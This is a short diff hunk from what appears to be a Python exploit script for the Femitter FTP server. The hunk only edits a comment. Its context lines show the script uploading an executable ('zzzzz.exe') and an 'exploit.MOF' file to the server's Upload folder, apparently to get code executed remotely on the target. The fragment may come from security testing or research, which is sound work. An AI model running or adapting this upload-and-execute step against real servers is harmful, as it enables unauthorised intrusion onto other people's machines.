@@ -100,7 +100,7 @@ except:
 try:	
 	print('[+] uploading payloads...')
 	ftp.cwd('Upload')
-	#ftp.cwd('writable filepath') <--Change this if femitter is not in default config!! 
+	#^Change this if femitter is not in default config^ 
 	ftp.storbinary('STOR zzzzz.exe', open('zzzzz.exe', 'rb'))
 	ftp.storbinary('STOR exploit.MOF', open('exploit.MOF', 'rb'))
 except:
